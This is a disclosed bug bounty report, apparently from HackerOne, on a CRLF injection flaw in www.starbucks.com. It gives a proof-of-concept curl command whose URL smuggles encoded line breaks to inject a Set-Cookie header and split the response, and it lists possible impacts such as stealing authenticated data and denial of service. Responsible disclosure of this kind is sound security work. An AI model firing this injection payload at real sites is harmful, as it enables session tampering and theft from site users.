# CRLF injection on www.starbucks.com

## Report Details
- **Report ID**: 858650
- **URL**: https://hackerone.com/reports/858650
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-24T13:24:18.455Z
- **Disclosed**: 2020-09-01T21:59:31.978Z

## Reporter
- **Username**: x3n0nn3p
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
The vulnerability allows setting arbitrary headers, and also enables response splitting which can then be exploited further.

POC:
curl -i 'https://www.starbucks.com/email-prospecttg9wh%0d%0aset-cookie:foo%0d%0a%0d%0a4t6uf?requesturl=/responsibility/global-report/policies' -d 'newsletter_signup_email=&newsletter_signup_zipcode=&newsletter_placement=footer' --http1.1

Screenshot Attached.


Regards

## Impact

### Impact
Possible impacts include;
- Stealing authenticated information via Ajax request with injected CORS headers
- Application DOS using overly long Cookies, etc.

## Attachments
- starbucks.jpg
